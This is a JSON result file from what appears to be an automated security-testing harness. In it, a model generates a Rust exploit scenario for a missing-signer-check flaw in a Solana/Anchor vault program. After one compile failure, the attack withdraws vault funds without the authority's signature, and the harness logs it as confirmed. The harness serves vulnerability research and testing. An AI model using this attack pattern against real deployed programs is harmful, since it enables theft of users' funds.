@@ -1,0 +1,107 @@
+{
+  "category": "SIGNER",
+  "verdict": "confirmed",
+  "exploit_successful": true,
+  "attack_result": "Success",
+  "reason": "ataque aceito e dano verificado: saldo do vault reduzido sem assinatura da authority; lamports do recipient aumentados sem assinatura da authority",
+  "attempts_used": 2,
+  "attempts": [
+    {
+      "attempt": 1,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2520,
+        "completion_tokens": 951,
+        "latency_s": 5.02
+      },
+      "raw": "{\n  \"plan\": \"O cenário inicializa um vault PDA com autoridade legítima e deposita fundos via baseline. Em seguida, tenta sacar usando a mesma autoridade, mas sem que ela assine a transação (AccountInfo em vez de Signer). O efeito medido é a redução do saldo do vault e o aumento dos lamports do recipient, demonstrando que a operação restrita foi executada sem a assinatura da autoridade.\",\n  \"scenario\": \"let authority = Pubkey::new_unique();\\nlet recipient = Pubkey::new_unique();\\nlet (vault_pda, bump) = Pubkey::find_program_address(&[b\\\"vault\\\", authority.as_ref()], &env.program_id);\\n\\n// Contas iniciais\\nlet authority_account = wallet(10_000_000_000);\\nlet recipient_account = wallet(1_000_000_000);\\nlet vault_account = empty_account();\\nlet system_program = system_program_account();\\n\\n// Baseline: initialize\\nlet ix_init = env.anchor_ix(\\\"initialize\\\", &(), &[\\n    AccountMeta::new(vault_pda, false),\\n    AccountMeta::new(authority, true),\\n    AccountMeta::new_readonly(system_program.0, false),\\n]);\\nlet accounts_init = vec![\\n    (vault_pda, vault_account.clone()),\\n    (authority, authority_account.clone()),\\n    system_program.clone(),\\n];\\nlet r_init = env.baseline(\\\"initialize vault\\\", &ix_init, &accounts_init);\\n\\n// Baseline: deposit\\nlet deposit_amount = 5_000_000_000u64;\\nlet ix_deposit = env.anchor_ix(\\\"deposit\\\", &deposit_amount, &[\\n    AccountMeta::new(vault_pda, false),\\n    AccountMeta::new(authority, true),\\n    AccountMeta::new_readonly(system_program.0, false),\\n]);\\nlet accounts_deposit = vec![\\n    (vault_pda, r_init.resulting_accounts.iter().find(|(k, _)| k == &vault_pda).map(|(_, a)| a.clone()).unwrap_or(vault_account)),\\n    (authority, authority_account.clone()),\\n    system_program.clone(),\\n];\\nlet r_deposit = env.baseline(\\\"deposit into vault\\\", &ix_deposit, &accounts_deposit);\\n\\n// Ataque: withdraw sem assinatura da authority\\nlet withdraw_amount = 1_000_000_000u64;\\nlet ix_withdraw = env.anchor_ix(\\\"withdraw\\\", &withdraw_amount, &[\\n    AccountMeta::new(vault_pda, false),\\n    AccountMeta::new_readonly(authority, false), // NÃO assina\\n    AccountMeta::new(recipient, false),\\n]);\\nlet vault_after_deposit = r_deposit.resulting_accounts.iter().find(|(k, _)| k == &vault_pda).map(|(_, a)| a.clone()).unwrap_or(vault_account);\\nlet accounts_withdraw = vec![\\n    (vault_pda, vault_after_deposit),\\n    (authority, authority_account.clone()),\\n    (recipient, recipient_account.clone()),\\n];\\nlet r_attack = env.attack(\\\"withdraw sem assinatura da authority\\\", &ix_withdraw, &accounts_withdraw);\\n\\nif r_attack.program_result == ProgramResult::Success {\\n    let vault_data = after(&r_attack, &vault_pda).data();\\n    let balance_after = read_u64(vault_data, 40); // authority (32) + balance (8) = offset 40\\n    let recipient_lamports = after(&r_attack, &recipient).lamports();\\n    env.effect(\\\"saldo do vault reduzido sem assinatura\\\", balance_after == deposit_amount - withdraw_amount);\\n    env.effect(\\\"lamports do recipient aumentados sem assinatura\\\", recipient_lamports == 1_000_000_000 + withdraw_amount);\\n}\"\n}",
+      "plan": "O cenário inicializa um vault PDA com autoridade legítima e deposita fundos via baseline. Em seguida, tenta sacar usando a mesma autoridade, mas sem que ela assine a transação (AccountInfo em vez de Signer). O efeito medido é a redução do saldo do vault e o aumento dos lamports do recipient, demonstrando que a operação restrita foi executada sem a assinatura da autoridade.",
+      "scenario": "let authority = Pubkey::new_unique();\nlet recipient = Pubkey::new_unique();\nlet (vault_pda, bump) = Pubkey::find_program_address(&[b\"vault\", authority.as_ref()], &env.program_id);\n\n// Contas iniciais\nlet authority_account = wallet(10_000_000_000);\nlet recipient_account = wallet(1_000_000_000);\nlet vault_account = empty_account();\nlet system_program = system_program_account();\n\n// Baseline: initialize\nlet ix_init = env.anchor_ix(\"initialize\", &(), &[\n    AccountMeta::new(vault_pda, false),\n    AccountMeta::new(authority, true),\n    AccountMeta::new_readonly(system_program.0, false),\n]);\nlet accounts_init = vec![\n    (vault_pda, vault_account.clone()),\n    (authority, authority_account.clone()),\n    system_program.clone(),\n];\nlet r_init = env.baseline(\"initialize vault\", &ix_init, &accounts_init);\n\n// Baseline: deposit\nlet deposit_amount = 5_000_000_000u64;\nlet ix_deposit = env.anchor_ix(\"deposit\", &deposit_amount, &[\n    AccountMeta::new(vault_pda, false),\n    AccountMeta::new(authority, true),\n    AccountMeta::new_readonly(system_program.0, false),\n]);\nlet accounts_deposit = vec![\n    (vault_pda, r_init.resulting_accounts.iter().find(|(k, _)| k == &vault_pda).map(|(_, a)| a.clone()).unwrap_or(vault_account)),\n    (authority, authority_account.clone()),\n    system_program.clone(),\n];\nlet r_deposit = env.baseline(\"deposit into vault\", &ix_deposit, &accounts_deposit);\n\n// Ataque: withdraw sem assinatura da authority\nlet withdraw_amount = 1_000_000_000u64;\nlet ix_withdraw = env.anchor_ix(\"withdraw\", &withdraw_amount, &[\n    AccountMeta::new(vault_pda, false),\n    AccountMeta::new_readonly(authority, false), // NÃO assina\n    AccountMeta::new(recipient, false),\n]);\nlet vault_after_deposit = r_deposit.resulting_accounts.iter().find(|(k, _)| k == &vault_pda).map(|(_, a)| a.clone()).unwrap_or(vault_account);\nlet accounts_withdraw = vec![\n    (vault_pda, vault_after_deposit),\n    (authority, authority_account.clone()),\n    (recipient, recipient_account.clone()),\n];\nlet r_attack = env.attack(\"withdraw sem assinatura da authority\", &ix_withdraw, &accounts_withdraw);\n\nif r_attack.program_result == ProgramResult::Success {\n    let vault_data = after(&r_attack, &vault_pda).data();\n    let balance_after = read_u64(vault_data, 40); // authority (32) + balance (8) = offset 40\n    let recipient_lamports = after(&r_attack, &recipient).lamports();\n    env.effect(\"saldo do vault reduzido sem assinatura\", balance_after == deposit_amount - withdraw_amount);\n    env.effect(\"lamports do recipient aumentados sem assinatura\", recipient_lamports == 1_000_000_000 + withdraw_amount);\n}",
+      "run": {
+        "kind": "compile_error",
+        "events": [],
+        "detail": "error[E0308]: mismatched types\n   --> tests/attempt.rs:20:52\n    |\n 20 |       let ix_init = env.anchor_ix(\"initialize\", &(), &[\n    |  _______________________---------____________________^\n    | |                       |\n    | |                       arguments to this method are incorrect\n 21 | |         AccountMeta::new(vault_pda, false),\n 22 | |         AccountMeta::new(authority, true),\n 23 | |         AccountMeta::new_readonly(system_program.0, false),\n 24 | |     ]);\n    | |_____^ expected `Vec<AccountMeta>`, found `&[AccountMeta; 3]`\nerror[E0308]: mismatched types\n   --> tests/attempt.rs:34:64\n    |\n 34 |       let ix_deposit = env.anchor_ix(\"deposit\", &deposit_amount, &[\n    |  __________________________---------_____________________________^\n    | |                          |\n    | |                          arguments to this method are incorrect\n 35 | |         AccountMeta::new(vault_pda, false),\n 36 | |         AccountMeta::new(authority, true),\n 37 | |         AccountMeta::new_readonly(system_program.0, false),\n 38 | |     ]);\n    | |_____^ expected `Vec<AccountMeta>`, found `&[AccountMeta; 3]`\nerror[E0308]: mismatched types\n   --> tests/attempt.rs:48:67\n    |\n 48 |       let ix_withdraw = env.anchor_ix(\"withdraw\", &withdraw_amount, &[\n    |  ___________________________---------_______________________________^\n    | |                           |\n    | |                           arguments to this method are incorrect\n 49 | |         AccountMeta::new(vault_pda, false),\n 50 | |         AccountMeta::new_readonly(authority, false), // NÃO assina\n 51 | |         AccountMeta::new(recipient, false),\n 52 | |     ]);\n    | |_____^ expected `Vec<AccountMeta>`, found `&[AccountMeta; 3]`\nerror: could not compile `dynamic-harness` (test \"attempt\") due to 3 previous errors",
+        "elapsed_s": 0.7
+      },
+      "verdict": null,
+      "reason": "erro de compilacao:\nerror[E0308]: mismatched types\n   --> tests/attempt.rs:20:52\n    |\n 20 |       let ix_init = env.anchor_ix(\"initialize\", &(), &[\n    |  _______________________---------____________________^\n    | |                       |\n    | |                       arguments to this method are incorrect\n 21 | |         AccountMeta::new(vault_pda, false),\n 22 | |         AccountMeta::new(authority, true),\n 23 | |         AccountMeta::new_readonly(system_program.0, false),\n 24 | |     ]);\n    | |_____^ expected `Vec<AccountMeta>`, found `&[AccountMeta; 3]`\nerror[E0308]: mismatched types\n   --> tests/attempt.rs:34:64\n    |\n 34 |       let ix_deposit = env.anchor_ix(\"deposit\", &deposit_amount, &[\n    |  __________________________---------_____________________________^\n    | |                          |\n    | |                          arguments to this method are incorrect\n 35 | |         AccountMeta::new(vault_pda, false),\n 36 | |         AccountMeta::new(authority, true),\n 37 | |         AccountMeta::new_readonly(system_program.0, false),\n 38 | |     ]);\n    | |_____^ expected `Vec<AccountMeta>`, found `&[AccountMeta; 3]`\nerror[E0308]: mismatched types\n   --> tests/attempt.rs:48:67\n    |\n 48 |       let ix_withdraw = env.anchor_ix(\"withdraw\", &withdraw_amount, &[\n    |  ___________________________---------_______________________________^\n    | |                           |\n    | |                           arguments to this method are incorrect\n 49 | |         AccountMeta::new(vault_pda, false),\n 50 | |         AccountMeta::new_readonly(authority, false), // NÃO assina\n 51 | |         AccountMeta::new(recipient, false),\n 52 | |     ]);\n    | |_____^ expected `Vec<AccountMeta>`, found `&[AccountMeta; 3]`\nerror: could not compile `dynamic-harness` (test \"attempt\") due to 3 previous errors"
+    },
+    {
+      "attempt": 2,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 3819,
+        "completion_tokens": 965,
+        "latency_s": 4.29
+      },
+      "raw": "{\"plan\": \"Preparo o vault via initialize (PDA com seeds [b\\\"vault\\\", authority]) e deposito fundos com deposit assinado pela authority. O ataque chama withdraw com a authority presente mas SEM assinar (AccountMeta::new_readonly(authority, false)), explorando a ausencia de Signer no campo authority do struct Withdraw. Se o programa aceitar, o saldo do vault cai e os lamports do recipient sobem sem qualquer assinatura da autoridade.\", \"scenario\": \"let authority = Pubkey::new_unique();\\nlet recipient = Pubkey::new_unique();\\nlet (vault_pda, _bump) = Pubkey::find_program_address(&[b\\\"vault\\\", authority.as_ref()], &env.program_id);\\n\\nlet authority_account = wallet(10_000_000_000);\\nlet recipient_account = wallet(1_000_000_000);\\nlet vault_account = empty_account();\\nlet (system_id, system_account) = system_program_account();\\n\\n// Baseline 1: initialize\\nlet ix_init = env.anchor_ix(\\\"initialize\\\", &(), vec![\\n    AccountMeta::new(vault_pda, false),\\n    AccountMeta::new(authority, true),\\n    AccountMeta::new_readonly(system_id, false),\\n]);\\nlet accounts_init = vec![\\n    (vault_pda, vault_account.clone()),\\n    (authority, authority_account.clone()),\\n    (system_id, system_account.clone()),\\n];\\nlet r_init = env.baseline(\\\"initialize vault\\\", &ix_init, &accounts_init);\\n\\nlet vault_after_init = r_init.resulting_accounts.iter().find(|(k, _)| k == &vault_pda).map(|(_, a)| a.clone()).unwrap_or(vault_account.clone());\\n\\n// Baseline 2: deposit\\nlet deposit_amount = 5_000_000_000u64;\\nlet ix_deposit = env.anchor_ix(\\\"deposit\\\", &deposit_amount, vec![\\n    AccountMeta::new(vault_pda, false),\\n    AccountMeta::new(authority, true),\\n    AccountMeta::new_readonly(system_id, false),\\n]);\\nlet accounts_deposit = vec![\\n    (vault_pda, vault_after_init),\\n    (authority, authority_account.clone()),\\n    (system_id, system_account.clone()),\\n];\\nlet r_deposit = env.baseline(\\\"deposit into vault\\\", &ix_deposit, &accounts_deposit);\\n\\nlet vault_after_deposit = r_deposit.resulting_accounts.iter().find(|(k, _)| k == &vault_pda).map(|(_, a)| a.clone()).unwrap_or(vault_account.clone());\\n\\n// Ataque: withdraw sem assinatura da authority\\nlet withdraw_amount = 1_000_000_000u64;\\nlet ix_withdraw = env.anchor_ix(\\\"withdraw\\\", &withdraw_amount, vec![\\n    AccountMeta::new(vault_pda, false),\\n    AccountMeta::new_readonly(authority, false),\\n    AccountMeta::new(recipient, false),\\n]);\\nlet accounts_withdraw = vec![\\n    (vault_pda, vault_after_deposit),\\n    (authority, authority_account.clone()),\\n    (recipient, recipient_account.clone()),\\n];\\nlet r_attack = env.attack(\\\"withdraw sem assinatura da authority\\\", &ix_withdraw, &accounts_withdraw);\\n\\nif r_attack.program_result == ProgramResult::Success {\\n    let vault_data = after(&r_attack, &vault_pda).data();\\n    let balance_after = read_u64(vault_data, 40);\\n    let recipient_lamports = after(&r_attack, &recipient).lamports();\\n    env.effect(\\\"saldo do vault reduzido sem assinatura da authority\\\", balance_after == deposit_amount - withdraw_amount);\\n    env.effect(\\\"lamports do recipient aumentados sem assinatura da authority\\\", recipient_lamports == 1_000_000_000 + withdraw_amount);\\n}\"}",
+      "plan": "Preparo o vault via initialize (PDA com seeds [b\"vault\", authority]) e deposito fundos com deposit assinado pela authority. O ataque chama withdraw com a authority presente mas SEM assinar (AccountMeta::new_readonly(authority, false)), explorando a ausencia de Signer no campo authority do struct Withdraw. Se o programa aceitar, o saldo do vault cai e os lamports do recipient sobem sem qualquer assinatura da autoridade.",
+      "scenario": "let authority = Pubkey::new_unique();\nlet recipient = Pubkey::new_unique();\nlet (vault_pda, _bump) = Pubkey::find_program_address(&[b\"vault\", authority.as_ref()], &env.program_id);\n\nlet authority_account = wallet(10_000_000_000);\nlet recipient_account = wallet(1_000_000_000);\nlet vault_account = empty_account();\nlet (system_id, system_account) = system_program_account();\n\n// Baseline 1: initialize\nlet ix_init = env.anchor_ix(\"initialize\", &(), vec![\n    AccountMeta::new(vault_pda, false),\n    AccountMeta::new(authority, true),\n    AccountMeta::new_readonly(system_id, false),\n]);\nlet accounts_init = vec![\n    (vault_pda, vault_account.clone()),\n    (authority, authority_account.clone()),\n    (system_id, system_account.clone()),\n];\nlet r_init = env.baseline(\"initialize vault\", &ix_init, &accounts_init);\n\nlet vault_after_init = r_init.resulting_accounts.iter().find(|(k, _)| k == &vault_pda).map(|(_, a)| a.clone()).unwrap_or(vault_account.clone());\n\n// Baseline 2: deposit\nlet deposit_amount = 5_000_000_000u64;\nlet ix_deposit = env.anchor_ix(\"deposit\", &deposit_amount, vec![\n    AccountMeta::new(vault_pda, false),\n    AccountMeta::new(authority, true),\n    AccountMeta::new_readonly(system_id, false),\n]);\nlet accounts_deposit = vec![\n    (vault_pda, vault_after_init),\n    (authority, authority_account.clone()),\n    (system_id, system_account.clone()),\n];\nlet r_deposit = env.baseline(\"deposit into vault\", &ix_deposit, &accounts_deposit);\n\nlet vault_after_deposit = r_deposit.resulting_accounts.iter().find(|(k, _)| k == &vault_pda).map(|(_, a)| a.clone()).unwrap_or(vault_account.clone());\n\n// Ataque: withdraw sem assinatura da authority\nlet withdraw_amount = 1_000_000_000u64;\nlet ix_withdraw = env.anchor_ix(\"withdraw\", &withdraw_amount, vec![\n    AccountMeta::new(vault_pda, false),\n    AccountMeta::new_readonly(authority, false),\n    AccountMeta::new(recipient, false),\n]);\nlet accounts_withdraw = vec![\n    (vault_pda, vault_after_deposit),\n    (authority, authority_account.clone()),\n    (recipient, recipient_account.clone()),\n];\nlet r_attack = env.attack(\"withdraw sem assinatura da authority\", &ix_withdraw, &accounts_withdraw);\n\nif r_attack.program_result == ProgramResult::Success {\n    let vault_data = after(&r_attack, &vault_pda).data();\n    let balance_after = read_u64(vault_data, 40);\n    let recipient_lamports = after(&r_attack, &recipient).lamports();\n    env.effect(\"saldo do vault reduzido sem assinatura da authority\", balance_after == deposit_amount - withdraw_amount);\n    env.effect(\"lamports do recipient aumentados sem assinatura da authority\", recipient_lamports == 1_000_000_000 + withdraw_amount);\n}",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": ""
+          },
+          {
+            "step": "baseline",
+            "note": "initialize vault",
+            "result": "Success",
+            "compute_units": 15866,
+            "account_flags": "-w,sw,-r"
+          },
+          {
+            "step": "baseline",
+            "note": "deposit into vault",
+            "result": "Success",
+            "compute_units": 4312,
+            "account_flags": "-w,sw,-r"
+          },
+          {
+            "step": "attack",
+            "note": "withdraw sem assinatura da authority",
+            "result": "Success",
+            "compute_units": 5524,
+            "account_flags": "-w,-r,-w"
+          },
+          {
+            "step": "effect",
+            "note": "saldo do vault reduzido sem assinatura da authority",
+            "holds": true
+          },
+          {
+            "step": "effect",
+            "note": "lamports do recipient aumentados sem assinatura da authority",
+            "holds": true
+          }
+        ],
+        "runtime_trace": [
+          "Program HF33f3iZYeK7qz7AE1aWWGvQuxArTudNjKVseAhTYCRC invoke [1]",
+          "Program 11111111111111111111111111111111 invoke [2]",
+          "Program 11111111111111111111111111111111 success",
+          "Program HF33f3iZYeK7qz7AE1aWWGvQuxArTudNjKVseAhTYCRC consumed 15866 of 1400000 compute units",
+          "Program HF33f3iZYeK7qz7AE1aWWGvQuxArTudNjKVseAhTYCRC success",
+          "Program HF33f3iZYeK7qz7AE1aWWGvQuxArTudNjKVseAhTYCRC invoke [1]",
+          "Program 11111111111111111111111111111111 invoke [2]",
+          "Program 11111111111111111111111111111111 success",
+          "Program HF33f3iZYeK7qz7AE1aWWGvQuxArTudNjKVseAhTYCRC consumed 4312 of 1400000 compute units",
+          "Program HF33f3iZYeK7qz7AE1aWWGvQuxArTudNjKVseAhTYCRC success",
+          "Program HF33f3iZYeK7qz7AE1aWWGvQuxArTudNjKVseAhTYCRC invoke [1]",
+          "Program HF33f3iZYeK7qz7AE1aWWGvQuxArTudNjKVseAhTYCRC consumed 5524 of 1400000 compute units",
+          "Program HF33f3iZYeK7qz7AE1aWWGvQuxArTudNjKVseAhTYCRC success"
+        ],
+        "elapsed_s": 1.8
+      },
+      "verdict": "confirmed",
+      "reason": "ataque aceito e dano verificado: saldo do vault reduzido sem assinatura da authority; lamports do recipient aumentados sem assinatura da authority"
+    }
+  ],
+  "case_id": "SSP-01-A-V",
+  "static_finding": {
+    "category": "SIGNER",
+    "evidence": "",
+    "explanation": "",
+    "attack_hypothesis": "Verificar por execucao se a instrucao e vulneravel a Missing Signer Check."
+  }
+}
